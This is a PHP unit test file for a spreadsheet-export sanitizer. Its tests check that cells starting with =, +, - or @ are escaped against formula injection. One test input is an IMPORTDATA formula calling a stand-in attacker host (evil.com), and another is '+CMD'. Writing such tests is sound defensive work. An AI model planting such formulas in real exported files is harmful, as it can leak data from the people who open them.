<?php

declare(strict_types=1);

namespace Tests\Unit\Transformers;

use MageTech\ImportExport\Transformers\Sanitizer;

it('sanitizes formula injection with equals sign', function () {
    $result = Sanitizer::sanitizeValue('=SUM(A1:A10)');
    expect($result)->toBe("'=SUM(A1:A10)");
});

it('sanitizes formula injection with plus sign', function () {
    $result = Sanitizer::sanitizeValue('+CMD');
    expect($result)->toBe("'+CMD");
});

it('sanitizes formula injection with minus sign', function () {
    $result = Sanitizer::sanitizeValue('-IMPORTDATA("http://evil.com")');
    expect($result)->toBe("'-IMPORTDATA(\"http://evil.com\")");
});

it('sanitizes formula injection with @ sign', function () {
    $result = Sanitizer::sanitizeValue('@SUM(A1)');
    expect($result)->toBe("'@SUM(A1)");
});

it('does not sanitize normal values', function () {
    expect(Sanitizer::sanitizeValue('Hello World'))->toBe('Hello World');
    expect(Sanitizer::sanitizeValue('123'))->toBe('123');
    expect(Sanitizer::sanitizeValue(''))->toBe('');
});

it('sanitizes arrays of values', function () {
    $result = Sanitizer::sanitizeRow(['name' => 'Test', 'formula' => '=A1+B1']);
    expect($result['name'])->toBe('Test');
    expect($result['formula'])->toBe("'=A1+B1");
});

it('trims whitespace', function () {
    expect(Sanitizer::sanitizeValue('  hello  '))->toBe('hello');
});
